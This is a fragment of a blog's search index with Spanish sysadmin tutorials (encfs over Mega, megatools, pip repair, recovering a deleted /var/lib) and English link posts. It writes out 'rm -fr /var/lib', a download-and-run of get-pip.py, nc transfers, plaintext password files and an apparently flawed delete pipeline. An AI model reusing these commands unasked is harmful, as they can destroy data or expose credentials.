nothing. Thomas & Erin Ptacek | sockpuppet.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/01/29/against-dnssec/","loc":"https://karpoke.ignaciocano.com/2015/01/29/against-dnssec/"},{"title":"Cifrar un directorio sincronizado en Mega con encfs","text":"Ya tenemos cuenta en Mega y las megatools instaladas . Ahora vamos a cifrar el directorio, pero en lugar de utilizar ecrypt tal como hicimos con Dropbox , esta vez usaremos encfs . Suponemos que tenemos dos directorios, ~/mega y ~/mega.enc . Utilizaremos encfs , disponible en los repositorios, para cifrar el contenido del primero en el segundo, y compartir el segundo en Mega. Creamos el directorio en Mega: bash $ megamkdir /Root/mega.enc Montamos el directorio cifrado: ```bash $ encfs --reverse /home/user/mega /home/user/mega.enc Creando nuevo volumen cifrado. Por favor, elige una de las siguientes opciones: pulsa \"x\" para modo experto de configuracion, pulsa \"p\" para modo paranoia pre-configurado, cualquier otra, o una linea vacia elegira el modo estandar. ?> x Seleccionado modo de configuración Manual. Los siguientes algoritmos de cifrado estan disponibles: 1. AES : 16 byte block cipher -- Soporta claves de longitud 128 hasta 256 bits Soporta bloques de tamaño 64 hasta 4096 bytes 2. Blowfish : Cifrado por bloques de 8 bytes -- Soporta claves de longitud 128 hasta 256 bits Soporta bloques de tamaño 64 hasta 4096 bytes Teclee el numero correspondiente a su eleccion: 1 Algoritmo seleccionado \"AES\" Por favor, elige un tamaño de clave en bits. El cifrado que has elegido soporta tamaños desde 128 a 256 bits en incrementos de 64 bits. Por ejemplo: 128, 192, 256 Tamaño de clave seleccionada: 256 Usando tamaño de clave de 256 bits Elige un tamaño de bloque en bytes. El cifrado que tu has elegido soporta tamaños desde 64 a 4096 bytes en incrementos de 16. O bien, pulsa Intro para elegir el tamaño por defecto (1024 bytes) Tamaño de bloque del sistema de ficheros: 4096 Usando tamaño de clave de 4096 bits Los siguientes algoritmos de cifrado de nombres de archivo estan disponibles: 1. Block : Codificación en bloques, oculta tamaño de los nombres de fichero 2. Null : No encryption of filenames 3. Stream : Codificacion en canal, guarda nombres de fichero tan cortos como sea posible. Teclee el numero correspondiente a su eleccion: 1 Algoritmo seleccionado \"Block\"\" --reverse especificado, no se está usando unique/chained IV Configuración finalizada. El sistema de ficheros a ser creado tiene las siguientes propiedades: Cifrado del sistema de ficheros: \"ssl/aes\", versión 3:0:2 Codificacion del nombre de fichero: \"nameio/block\", versión 3:0:1 Tamaño de la llave: 256 bytes Tamaño de Bloque: 4096 bytes Agujeros en archivos pasados a través del ciphertext. Ahora tendrás que introducir una contraseña para tu sistema de ficheros. Necesitaras recordar esta contraseña, dado que no hay absolutamente ningún mecanismo de recuperación. Sin embargo, la contraseña puede ser cambiada más tarde usando encfsctl. Nueva contraseña Encfs: Verifique la contraseña Encfs: ``` Si no queremos tener que introducir la contraseña cada vez que montemos el directorio, podemos un comando que vuelque el contenido de un fichero con dicha clave, por ejemplo ~/.encfs_passwd : bash $ encfs --reverse --extpass=\"cat ~/.encfs_passwd\" /home/user/mega /home/user/mega.enc Y sincronizamos: bash $ megasync -l ~/mega.enc -r /Root/mega.enc Actualizado el 17 de mayo de 2015 Si queremos que el directorio se monte al inicio, sin necesidad de que nos pida la contraseña, necesitaremos crear un script que invocaremos desde el fichero /etc/fstab . El motivo es que en el propio fichero fstab no podemos pasarle opciones al comando encfs , por lo que enmascararemos éstas dentro del script : ```bash !/usr/bin/env bash /usr/bin/encfs --public --extpass=\"cat /home/user/.encfs_passwd\" --reverse $* ``` Y en el fstab : bash /usr/local/bin/encfs.sh#/home/user/mega /home/user/mega.enc fuse rw,user,auto 0 0 Si queremos probarlo antes del próximo reinicio, basta que desmontemos el directorio y utilicemos el comando mount para volver a montarlo: bash $ umount /home/user/mega.enc $ mount /home/user/mega.enc Referencias » Encrypted filesystem on Mega.co.nz","tags":"admin","url":"https://karpoke.ignaciocano.com/2015/01/28/cifrar-un-directorio-sincronizado-en-mega-con-encfs/","loc":"https://karpoke.ignaciocano.com/2015/01/28/cifrar-un-directorio-sincronizado-en-mega-con-encfs/"},{"title":"MegaSync y Megatools para acceder a Mega desde Ubuntu","text":"El servicio de almacenamiento en la nube de Mega ofrece hasta 50 GB de espacio gratuito (10 GB de transferencia al mes), cifrado, multiplataforma, con sincronizado selectivo y está disponible desde el navegador. Con 50 GB da para guardar algunas copias de seguridad de nuestros archivos, correos o bases de datos . A continuación, veremos cómo instalar el cliente y acceder desde el terminal de nuestro servidor. Instalación en el escritorio Aunque vayamos a instalarlo en el servidor, no he querido dejar de comentar la instalación de escritorio, que es realmente sencilla. Instalamos la librería libcrypto++9 desde los repositorios y, a continuación, descargamos el paquete , en este caso para Ubuntu Trusty Tahr 14.04 32 bits, y lo instalamos: bash $ wget https://mega.nz/linux/MEGAsync/xUbuntu_14.04/i386/megasync-xUbuntu_14.04_i386.deb $ sudo dpkg -i megasync-xUbuntu_14.04_i386.deb Actualizado el 2 de mayo de 2015 Si al realizar la actualización del sistema nos aparece el error: ```bash W: Se produjo un error durante la verificación de las firmas. El repositorio no está actualizado y se utilizarán los ficheros de índice antiguos. El error GPG es: http://mega.nz ./ Release: Las firmas siguientes no se pudieron verificar porque su llave pública no está disponible: NO_PUBKEY AC025B14069B6221 W: Fallo al renombrar http://mega.nz/linux/MEGAsync/xUbuntu_14.10/./Release: W: Algunos archivos de índice fallaron al descargar. Se han ignorado, o se han utilizado unos antiguos en su lugar ``` Comprobamos si está disponible la clave: bash $ gpg --keyserver keyserver.ubuntu.com --recv-keys AC025B14069B6221 gpg: solicitando clave 069B6221 de hkp servidor keyserver.ubuntu.com gpg: clave 069B6221: «MEGAsync OBS Project » sin cambios gpg: Cantidad total procesada: 1 gpg: sin cambios: 1 Y la actualizamos: bash $ sudo apt-key adv --recv-keys --keyserver keyserver.ubuntu.com AC025B14069B6221 Ahora ya podremos actualizar normalmente. Hay que tener en cuenta que nuestra contraseña se utiliza para cifrar el contenido, por lo que si la perdemos, lo perdemos todo. Cabe recordar que también tenemos la opción de exportar la clave principal y tenerla a buen recaudo. Instalación en el servidor Si queremos instalarlo en nuestro servidor, podemos recurrir a las megatools desde el repositorio y compilarlas, o bien hacerlo desde el PPA , aunque éste último ya no está mantenido desde Quantal. Lo que haremos esta vez será bajar una de las compilaciones ya preparadas : bash $ wget http://megatools.megous.com/builds/megatools-1.9.94.tar.gz $ wget http://megatools.megous.com/builds/megatools-1.9.94.tar.gz.asc Actualizado el 26 de abril de 2015 Lo había dado por hecho, pero no está demás comentar que es altamente recomendable que comprobemos la firma: bash $ gpg --verify megatools-1.9.94.tar.gz.asc gpg: Signature made vie 02 ene 2015 08:43:50 CET using DSA key ID A7BB2AC1 gpg: Can't check signature: public key not found En este caso, aún no la tenemos, así que la buscamos, y tras confirmar que corresponde al creador del paquete , la instalamos: bash $ gpg --search-keys A7BB2AC1 gpg: searching for \"A7BB2AC1\" from hkp server keys.gnupg.net (1) Ondrej Jirman 1024 bit DSA key A7BB2AC1, created: 2003-08-24 Keys 1-1 of 1 for \"A7BB2AC1\". Enter number(s), N)ext, or Q)uit > 1 gpg: requesting key A7BB2AC1 from hkp server keys.gnupg.net gpg: key A7BB2AC1: public key \"Ondrej Jirman \" imported gpg: Total number processed: 1 gpg: imported: 1 Volvemos a comprobar la firma: bash $ gpg --verify megatools-1.9.94.tar.gz.asc gpg: Signature made vie 02 ene 2015 08:43:50 CET using DSA key ID A7BB2AC1 gpg: Good signature from \"Ondrej Jirman \" gpg: WARNING: This key is not certified with a trusted signature! gpg: There is no indication that the signature belongs to the owner. Primary key fingerprint: D79E 2F84 317E 26CE 8EFD A605 BF23 1000 A7BB 2AC1 La criticidad del aviso dependerá de la confianza que pongamos en la clave pública. Lo ideal sería que hubiéramos recibido la clave directamente de mano del propietario, pero por lo general se suele bajar de internet. En este caso, considero que la probabilidad de que la clave descargada haya sido modificada es prácticamente nula, así que procedemos confiadamente. Descomprimimos el paquete: bash $ tar xzvf megatools-1.9.94.tar.gz $ cd megatools-1.9.94 Instalamos las dependencias: bash $ sudo aptitude install build-essential libglib2.0-dev libssl-dev libgirepository1.0-dev libcurl4-gnutls-dev glib-networking He probado libcurl4-gnutls-dev en lugar de libcurl4-openssl-dev y parece que no hay problemas. Instalamos: bash $ ./configure $ make $ sudo make install # o sudo checkisntall Uso Si aún no habíamos resgistrado la cuenta desde la web, podemos hacerlo con el comando megareg . Si nos aparece un error como el siguiente: bash megareg: error while loading shared libraries: libmega.so.0: cannot open shared object file: No such file or directory es que las librerías no están preparadas para utilizarse. Lo resolvemos ejecutando: bash $ sudo ldconfig Comandos disponibles: bash megareg Register and verify a new mega account megadf Show your cloud storage space usage/quota megals List all remote files megamkdir Create remote directory megarm Remove remote file or directory megamv Move and rename remote files megaput Upload individual files megaget Download individual files megadl Download file from a \"public\" Mega link (doesn't require login) megastream Streaming download of a file (can be used to preview videos or music) megasync Upload or download a directory tree megafs Mount remote filesystem locally. Por ejemplo, para comprobar el espacio disponible: bash $ megadf -u john@example.com -p password Total: 53687091200 Used: 0 Free: 53687091200 Para no tener que escribir el usuario y la contraseña en la terminal, podemos crear el siguiente archivo de configuración (ver man megarc ): bash $ cat ~/.megarc [Login] Username = john@example.com Password = password Creamos un directorio remoto: bash $ megamkdir /Root/test # el prefijo /Root es necesario. ver `man megatools` Subir un archivo: bash $ megaput file.txt # se sube a /Root $ megaput --path /Root/test file.txt Subir varios archivos en paralelo : bash $ ls file*.txt | xargs -n1 -P4 megaput Para sincronizar el directorio /home/user/mega con el directorio que acabamos de crear, podemos subir el directorio: bash $ megasync -l /home/user/mega -r /Root/test O descargarlo: bash $ megasync -l /home/user/mega -r /Root/test --download Si habíamos eliminado algún fichero y no se descarga, podemos limpiar la caché utilizando el argumento --reload . Un problema con la sincronización es que los archivos que hayamos eliminado a través de otro canal, por ejemplo accediendo a través del navegador, no se borrarán en nuestro servidor local. Para remediarlo, podemos consultar los ficheros que no están en el servidor y borrarlos: bash $ megasync --reload -n -l /home/user/mega -r /Root/test 2>/dev/null | sed 's|F /Root/test|/home/user/mega|' | xargs -0 rm Cifrado del directorio Una buena idea sería sincronizar un directorio cifrado . De esta forma, no tendríamos que confiar en que nuestros archivos estén realmente cifrados en los servidores de Mega. En el siguiente artículo, podemos ver cómo cifrar un directorio en Mega con encfs .","tags":"admin","url":"https://karpoke.ignaciocano.com/2015/01/27/megasync-y-megatools-para-acceder-a-mega-desde-ubuntu/","loc":"https://karpoke.ignaciocano.com/2015/01/27/megasync-y-megatools-para-acceder-a-mega-desde-ubuntu/"},{"title":"More shell, less egg","text":"The program Bentley asked Knuth to write is one that's become familiar to people who use languages with serious text-handling capabilities: Read a file of text, determine the n most frequently used words, and print out a sorted list of those words along with their frequencies. Dr. Drang | leancrew.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/01/21/more-shell-less-egg/","loc":"https://karpoke.ignaciocano.com/2015/01/21/more-shell-less-egg/"},{"title":"RoboCop (1987) Is an Almost Perfectly Symmetrical Film","text":"The Old Testament is full of examples of chiasmus, which is a figure of speech used in ancient times to emphasize balance. It lists a bunch of ideas or things and then repeats each of them in reverse order. It's often not an identical repetition. It frequently uses the opposite of what came before or something similar to it. Robert Lockard | dejareviewer.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/01/21/robocop-1987-is-an-almost-perfectly-symmetrical-film/","loc":"https://karpoke.ignaciocano.com/2015/01/21/robocop-1987-is-an-almost-perfectly-symmetrical-film/"},{"title":"Functional word processor built in Minecraft","text":"There was a time not so long ago when Minecraft was actually a game. Now, it's an insane sandbox where people build all kinds of incredibly complex things… like a word processor… out of blocks. This crazy contraption is the work of a a third-year robotics student who goes by the name of Koala_Steamed on YouTube. It's the result of nearly two years of painstaking work inside the Minecraft world. That's not continuous, mind you. Breaks were obviously taken to do things like attend classes, use the washroom, and interact with people and things that had curves. Lee Mathews | geek.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/01/18/functional-word-processor-built-in-minecraft/","loc":"https://karpoke.ignaciocano.com/2015/01/18/functional-word-processor-built-in-minecraft/"},{"title":"The Rule of The Big Three (and a half) – Resource Management in C++","text":"The dynamic creation and destruction of objects was always one of the bugbears of C. It required the programmer to (manually) control the allocation of memory for the object, handle the object's initialisation then ensure that the object was safely cleaned-up after use and its memory returned to the heap. Because many C programmers weren't educated in the potential problems (or were just plain lazy or delinquent in their programming) C got a reputation in some quarters for being an unsafe, memory-leaking language. Glennan Carnie | blog.feabhas.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/01/18/the-rule-of-the-big-three-and-a-half-resource-management-in-c/","loc":"https://karpoke.ignaciocano.com/2015/01/18/the-rule-of-the-big-three-and-a-half-resource-management-in-c/"},{"title":"HSTS Super Cookies","text":"Using HSTS to track your browsing habits evades the features of web browsers designed to control more normal \"cookie\" based tracking mechanisms. Using \"incognito\" or \"private\" modes means that existing cookies won't be shared with sites you visit. Browsers also let you entirely delete cookies that could be used to track you. Because HSTS is a security feature and isn't intended to be used for tracking, web browsers treat it differently from cookies. It is only by intentional misapplication that HSTS can be exploited to track users. Sam Greenhalgh | radicalresearch.co.uk","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/01/11/hsts-super-cookies/","loc":"https://karpoke.ignaciocano.com/2015/01/11/hsts-super-cookies/"},{"title":"How we made editing Wikipedia twice as fast","text":"HipHop Virtual Machine, or HHVM, reduces the median page-saving time for editors from about 7.5 seconds to 2.5 seconds, and the mean page-saving time from about 6 to 3 seconds. Below, I'll explain the technical background for HHVM on MediaWiki and some of the far-reaching benefits of this change that will go beyond the recent performance gains. Ori Livneh | blog.wikimedia.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/01/11/how-we-made-editing-wikipedia-twice-as-fast/","loc":"https://karpoke.ignaciocano.com/2015/01/11/how-we-made-editing-wikipedia-twice-as-fast/"},{"title":"An unbeatable computer program has finally solved two-player limit Texas hold'em poker","text":"Two-player limit Texas hold'em poker has finally been solved, according to a study published in Science today. Scientists have designed a computer program, named Cepheus, with a strategy for the game that is so close to perfect that statistical analysis shows it can't be defeated by a human poker player, even if that player competed against the computer for an entire lifetime. This means that no matter how the game starts out, the computer will win or break even in the long run — making it essentially unbeatable. » Cepheus Arielle Duhaime-Ross | theverge.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/01/10/an-unbeatable-computer-program-has-finally-solved-two-player-limit-texas-holdem-poker/","loc":"https://karpoke.ignaciocano.com/2015/01/10/an-unbeatable-computer-program-has-finally-solved-two-player-limit-texas-holdem-poker/"},{"title":"Code rot & OpenBSD","text":"The background is set, you know why I took interest now it's time to tell what solidified the decision. Each change made to the OpenBSD codebase undergoes a code review before it's committed to the tree. If you managed to get that far in this article you perfectly know why I deem that of upmost importance. No matter how many features your software has, if your documentation is sub-par then your software is most likely useless. The quality of OpenBSD documentation is on a level I didn't expect even after reading about it in so many places. Not only will you get information on how something works, what's possible and how to use it. It will also tell you the best practices for using the tool and warn you about the common pitfalls. » homing-on-code.blogspot.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/01/06/code-rot-openbsd/","loc":"https://karpoke.ignaciocano.com/2015/01/06/code-rot-openbsd/"},{"title":"Secure Secure Shell","text":"Reading the documents, I have the feeling that the NSA can 1) decrypt weak crypto and 2) steal keys. Let's focus on the crypto first. SSH supports different key exchange algorithms, ciphers and message authentication codes. The server and the client choose a set of algorithms supported by both, then proceed with the key exchange. Some of the supported algorithms are not so great and should be disabled completely. If you leave them enabled but prefer secure algorithms, then a man in the middle might downgrade you to bad ones. This hurts interoperability but everyone uses OpenSSH anyway. » stribika.github.io","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/01/06/secure-secure-shell/","loc":"https://karpoke.ignaciocano.com/2015/01/06/secure-secure-shell/"},{"title":"Software Library: MS-DOS Games","text":"Software for MS-DOS machines that represent entertainment and games. The collection includes action, strategy, adventure and other unique genres of game and entertainment software. Through the use of the EM-DOSBOX in-browser emulator, these programs are bootable and playable. Please be aware this browser-based emulation is still in beta - contact Jason Scott, Software Curator, if there are issues or questions. » archive.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/01/05/software-library-ms-dos-games/","loc":"https://karpoke.ignaciocano.com/2015/01/05/software-library-ms-dos-games/"},{"title":"Solucionado el error «ImportError: cannot import name IncompleteRead» al ejecutar pip en Ubuntu Trusty Tahr 14.04","text":"Si al ejecutar pip nos encontramos con el siguiente error: bash Traceback (most recent call last): File \"/usr/bin/pip\", line 9, in load_entry_point('pip==1.5.4', 'console_scripts', 'pip')() File \"/usr/local/lib/python2.7/dist-packages/pkg_resources.py\", line 352, in load_entry_point return get_distribution(dist).load_entry_point(group, name) File \"/usr/local/lib/python2.7/dist-packages/pkg_resources.py\", line 2307, in load_entry_point return ep.load() File \"/usr/local/lib/python2.7/dist-packages/pkg_resources.py\", line 2021, in load entry = __import__(self.module_name, globals(),globals(), ['__name__']) File \"/usr/lib/python2.7/dist-packages/pip/__init__.py\", line 11, in from pip.vcs import git, mercurial, subversion, bazaar # noqa File \"/usr/lib/python2.7/dist-packages/pip/vcs/mercurial.py\", line 9, in from pip.download import path_to_url File \"/usr/lib/python2.7/dist-packages/pip/download.py\", line 25, in from requests.compat import IncompleteRead ImportError: cannot import name IncompleteRead Parece ser debido a un problema entre el paquete requests y pip . A partir de las versión 2.4.0 de requests se eliminó requests.compat.IncompleteRead . Sin embargo, las versiones de pip anteriores a julio de 2014 aún utilizan IncompleteRead . En la vesión actual de pip ya no ocurre este problema por lo que la solución pasa por actualizarlo : bash $ wget https://bootstrap.pypa.io/get-pip.py $ sudo python get-pip.py","tags":"admin","url":"https://karpoke.ignaciocano.com/2015/01/02/solucionado-el-error-importerror-cannot-import-name-incompleteread-al-ejecutar-pip-en-ubuntu-trusty-tahr-14-04/","loc":"https://karpoke.ignaciocano.com/2015/01/02/solucionado-el-error-importerror-cannot-import-name-incompleteread-al-ejecutar-pip-en-ubuntu-trusty-tahr-14-04/"},{"title":"Homenaje a un clásico: las 10 mejores curiosidades de Monkey Island","text":"Monkey Island es uno de los videojuegos más míticos de todos los tiempos. Está lleno de pequeñas curiosidades, anécdotas y huevos de pascua. Estas son 10 de nuestras favoritas. Carlos Rebato | gizmodo.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/01/01/homenaje-a-un-clasico-las-10-mejores-curiosidades-de-monkey-island/","loc":"https://karpoke.ignaciocano.com/2015/01/01/homenaje-a-un-clasico-las-10-mejores-curiosidades-de-monkey-island/"},{"title":"Quake on an oscilloscope: A technical report","text":"A summary of some problems I faced when tinkering with Quake to get it play nicely on an oscilloscope. After seeing some cool clips like this mushroom thing and of course Youscope, playing Quake on a scope seemed like a great idea. It ticks all the marks that make me happy: low-poly, realtime rendered and open source. Pekka Väänänen | lofibucket.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/01/01/quake-on-an-oscilloscope-a-technical-report/","loc":"https://karpoke.ignaciocano.com/2015/01/01/quake-on-an-oscilloscope-a-technical-report/"},{"title":"El 'canon AEDE': claves del presente y el futuro de la tasa de agregación de contenidos","text":"Este jueves, 1 de enero, entra en vigor gran parte de la ley Lassalle de propiedad intelectual y con ella su artículo 32.2, que obliga a los editores y autores a cobrar —aunque no quieran— cuando los agregadores de Internet enlacen y distribuyan sus contenidos. Estos son los aspectos clave a tener en cuenta sobre el denominado canon AEDE. M.M. | 20minutos.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/01/01/el-canon-aede-claves-del-presente-y-el-futuro-de-la-tasa-de-agregacion-de-contenidos/","loc":"https://karpoke.ignaciocano.com/2015/01/01/el-canon-aede-claves-del-presente-y-el-futuro-de-la-tasa-de-agregacion-de-contenidos/"},{"title":"10 Futurama jokes that will make you smarter","text":"The Futurama writers had a rule that the show's more obscure jokes couldn't be central to the plot. So the background is stuffed with nods to mathematics, science, history, and literature. Numbers are often translated into math problems (instead of Studio 54, the crew visits Studio 1²2¹3³). Robot information is conveyed in binary (\"The Honking\" references the \"Redrum\" scene in The Shining, when Bender is perplexed to see \"0101100101\" written in blood on a wall, but then realizes that it reads \"1010011010\" in the mirror, a series of digits that translates to \"666\"). And of course, there's the Alienese language. But the writers also built entire episodes around the Banach-Tarski paradox and the premise of three-dimensional characters entering two-dimensional space. Lauren Davis | io9.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/01/01/10-futurama-jokes-that-will-make-you-smarter/","loc":"https://karpoke.ignaciocano.com/2015/01/01/10-futurama-jokes-that-will-make-you-smarter/"},{"title":"Ringing in 2015 with 40 Linux-friendly hacker SBCs","text":"In May of this year, LinuxGizmos and Linux.com collaborated on a joint survey, asking our readers to choose their favorite open-spec hacker SBCs from a list of 32 that run Linux and/or Android. Our SBC survey winners, ranked one to five, included the Raspberry Pi, BeagleBone Black, Odroid-XU, CubieTruck, and Banana Pi single board computers. Thanks to the flood of new open-spec, community-backed boards, as well as the demise of others, we have updated our list for this end-of-year snapshot. Eric Brown | linuxgizmos.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/01/01/ringing-in-2015-with-40-linux-friendly-hacker-sbcs/","loc":"https://karpoke.ignaciocano.com/2015/01/01/ringing-in-2015-with-40-linux-friendly-hacker-sbcs/"},{"title":"The Origins of the  Tag","text":"Sometime in late summer I took a break with some of the other engineers and went to a local bar on Castro street in Mountain View. The bar was the St. James Infirmary and it had a 30 foot wonder woman statue inside among other interesting things. At some point in the evening I mentioned that it was sad that Lynx was not going to be able to display many of the HTML extensions that we were proposing, I also pointed out that the only text style that Lynx could exploit given its environment was blinking text. We had a pretty good laugh at the thought of blinking text, and talked about blinking this and that and how absurd the whole thing would be. Lou Montulli | montulli.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/12/30/the-origins-of-the-tag/","loc":"https://karpoke.ignaciocano.com/2014/12/30/the-origins-of-the-tag/"},{"title":"What Absolutely Everyone Needs To Know About Isaac Asimov's Foundation","text":"It's an accomplishment all the more remarkable given that the story driving the Foundation Trilogy — an epic tale of the fall and rise of future galactic empires —contains virtually none of the usual tropes that are associated with science fiction. The novels span the entire galaxy, but no extraterrestrials make an appearance. It depicts the future history of human society, but it's neither explicitly a utopian nor dystopian parable. There's plenty of futuristic technology—from faster-than-light spacecraft to personal force fields—but all of this serves as the background, not the driver, of the plot. In fact, Foundation appears to contradict Asimov's own definition of science fiction, as a \"branch of literature which deals with the reaction of human beings to changes in science and technology.\" In this case, though, Asimov would later explain that he set out to create a genre he called \"social science fiction.\" He used the future as a template to explore a pivotal idea that we've been asking for centuries: Are there laws of human history as immutable as the laws of physics? Mark Strauss | io9.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/12/27/what-absolutely-everyone-needs-to-know-about-isaac-asimovs-foundation/","loc":"https://karpoke.ignaciocano.com/2014/12/27/what-absolutely-everyone-needs-to-know-about-isaac-asimovs-foundation/"},{"title":"Recuperar el sistema tras borrar «/var/lib»","text":"Si por casualidad acabamos ejecutando un rm -fr /var/lib , tendremos un pequeño problema. El directorio /var/lib está pensado para que los programas instalados guarden información variable (ver man hier ). Puestos a suponer, supongamos que esto es exactamente lo que acaba de pasar, que aún no hemos reiniciado la máquina y que seguimos teniendo acceso por SSH. Copias de seguridad En este momento, ya es tarde para pensar en copias de seguridad si no las habíamos hecho antes. Habrá información que hayamos perdido y que sea imposible recuperar, por ejemplo, las bases de datos MySQL . Probablemente, perderemos información importante para los programas y es posible que recuperar el sistema en lugar de reinstalar favorezca que haya toda clase de errores extraños. Además, tras borrar el directorio /var/lib , programas como dpkg y apt-get o aptitude no funcionarán, ya que guardan información de los programas instalados en directorios como /var/lib/dpkg , /var/lib/apt o /var/lib/aptitude , lo que provoca que la recuperación del sistema sea tediosa. Recuperar el instalador El primer paso es poder ejecutar el instalador de paquetes de nuevo, para poder reinstalar todos los paquetes. Para esto, partiremos de un livecd de la misma versión que tengamos instalada y copiaremos el directorio /var/lib/dpkg , en este caso, Ubuntu Server 14.04.1 de 32 bits : bash $ wget http://releases.ubuntu.com/14.04/ubuntu-14.04.1-server-i386.iso Podemos utilizar unetbootin para instalar la distribución en un USB, o como en este caso, ejecutar una máquina virtual con virtualbox y especificando que el disco contenga esa ISO. Arrancamos la máquina virtual y seleccionamos el \"Modo rescate\". Desde la consola de rescate, copiaremos el contenido del directorio /var/lib a la máquina en la que hemos sufrido el percance, cuya IP pongamos que sea 192.168.1.100: bash (virtualbox)$ cd /tmp (virtualbox)$ tar -cf lib.tar /var/lib (virtualbox)$ cat lib.tar | nc 192.168.1.100 9090 En la máquina a reparar debemos ejecutar: bash $ mkdir /tmp/recover $ cd /tmp/recover $ sudo ufw allow proto tcp from 192.168.50.0/24 to any port 9090 $ nc -l 9090 | tar x $ sudo ufw delete allow proto tcp from 192.168.50.0/24 to any port 9090 $ sudo chown -R root:root var/lib $ sudo mv var/lib /var Si todo ha ido bien, deríamos poder ejecutar algunos comandos: bash $ sudo dpkg --audit $ sudo apt-get update $ sudo apt-get check $ sudo dpkg --configure -a $ sudo apt-get install -f $ sudo apt-get upgrade Reinstalar todos los programas Podemos encontrar una copia del fichero /var/lib/dpkg/status con toda la información de los paquetes instalados en /var/backups/dpkg.status.0 . También podemos revisar el fichero /var/log/apt.log para reinstalar los últimos paquetes añadidos o eliminados: bash $ /var/tmp/packages0.list $ sudo apt-get --reinstall install `cat /var/tmp/packages0.list` Es posible que algunos paquetes den error debido a alguna depedencia que no está correctamente instalada, pero conforme se van reinstalando todos, deberían quedar todos correctamente instalados. Ej: bash E: Couldn't configure pre-depend dpkg:i386 for mountall:i386, probably a dependency cycle. También iremos viendo avisos como el siguiente, especialmente de aquellos paquetes que necesitaremos reinstalar: bash dpkg: aviso: falta el fichero de lista de ficheros del paquete `python-lxml', se supondrá que el paquete no tiene ningún fichero actualmente instalado Una vez que termine, nos aseguramos que los ficheros base quedaron bien instalados : bash $ sudo apt-get download base-files $ sudo apt-get install --reinstall base-files Recuperar MySQL MySQL guarda los ficheros de la base de datos en /var/lib/mysql/ . Si tuviéramos una copia, recuperar la base de datos sería tan sencillo como ejecutar: bash $ mysql -uroot -p < mysql_backup.sql","tags":"admin","url":"https://karpoke.ignaciocano.com/2014/12/26/recuperar-el-sistema-tras-borrar-varlib/","loc":"https://karpoke.ignaciocano.com/2014/12/26/recuperar-el-sistema-tras-borrar-varlib/"},{"title":"12 million home and business routers vulnerable to critical hijacking hack","text":"More than 12 million routers in homes and small offices are vulnerable to attacks that allow hackers anywhere in the world to monitor user traffic and take administrative control over the devices, researchers said. The vulnerability resides in \"RomPager\" software, embedded into the residential gateway devices, made by a company known as AllegroSoft. Versions of RomPager prior to 4.34 contain a critical bug that allows attackers to send simple HTTP cookie files that corrupt device memory and hand over administrative control. Attackers can use that control to read plaintext traffic traveling over the device and possibly take other actions, including changing sensitive DNS settings and monitoring or controling Web cams, computers, or other connected devices. Researchers from Check Point's malware and vulnerability group have dubbed the bug Misfortune Cookie, because it allows hackers to determine the \"fortune\" of an HTTP request by manipulating cookies. » Misfortune Cookie | mis.fortunecook.ie Dan Goodin | arstechnica.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/12/21/12-million-home-and-business-routers-vulnerable-to-critical-hijacking-hack/","loc":"https://karpoke.ignaciocano.com/2014/12/21/12-million-home-and-business-routers-vulnerable-to-critical-hijacking-hack/"},{"title":"Was the Death Star Attack an Inside Job?","text":"We've all heard the \"official conspiracy theory\" of the Death Star attack. We all know about Luke Skywalker and his ragtag bunch of rebels, how they mounted a foolhardy attack on the most powerful, well-defended battle station ever built. And we've all seen the video over, and over, and over, of the one-in-a-million shot that resulted in a massive chain reaction that not just damaged, but completely obliterated that massive technological wonder. » debunking911.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/12/21/was-the-death-star-attack-an-inside-job/","loc":"https://karpoke.ignaciocano.com/2014/12/21/was-the-death-star-attack-an-inside-job/"},{"title":"Announcing Ubuntu Core, with snappy transactional updates!","text":"What if your cloud instances could be updated with the same certainty and precision as your mobile phone – with carrier grade assurance that an update applies perfectly or is not applied at all? What if your apps could be isolated from one another completely, so there's no possibility that installing one app could break another, and stronger assurance that a compromise of one app won't compromise the data from another? When we set out to build the Ubuntu Phone we took on the challenge of raising the bar for reliability and security in the mobile market. And today that same technology is coming to the cloud, in the form of a new \"snappy\" image called Ubuntu Core Mark Shuttleworth | markshuttleworth.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/12/09/announcing-ubuntu-core-with-snappy-transactional-updates/","loc":"https://karpoke.ignaciocano.com/2014/12/09/announcing-ubuntu-core-with-snappy-transactional-updates/"},{"title":"Ten years of Ubuntu: how Linux's beloved newcomer became its criticized king","text":"In October of 2004, a new Linux distro appeared on the scene with a curious name\"Ubuntu. Even then there were hundreds, today if not thousands, of different Linux distros available. A new one wasn't particularly unusual, and for some time after its quiet preview announcement, Ubuntu went largely unnoticed. It was yet another Debian derivative. Today, Canonical, the company behind Ubuntu, estimates that there are 25 million Ubuntu users worldwide. That makes Ubuntu the world's third most popular PC operating system. By Canonical's estimates, Ubuntu has roughly 90 percent of the Linux market. And Ubuntu is poised to launch a mobile version that may well send those numbers skyrocketing again. Scott Gilbertson | arstechnica.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/12/07/ten-years-of-ubuntu-how-linuxs-beloved-newcomer-became-its-criticized-king/","loc":"https://karpoke.ignaciocano.com/2014/12/07/ten-years-of-ubuntu-how-linuxs-beloved-newcomer-became-its-criticized-king/"},{"title":"¿Dónde aprendieron los 'hackers' a ser 'hackers'?","text":"Una de las principales premisas éticas del 'hacker', desde los primeros grupos que aparecieron en los años 90 del siglo pasado, es la difusión de información sobre cómo funcionan las redes, los ordenadores y, en general, la tecnología. » II » 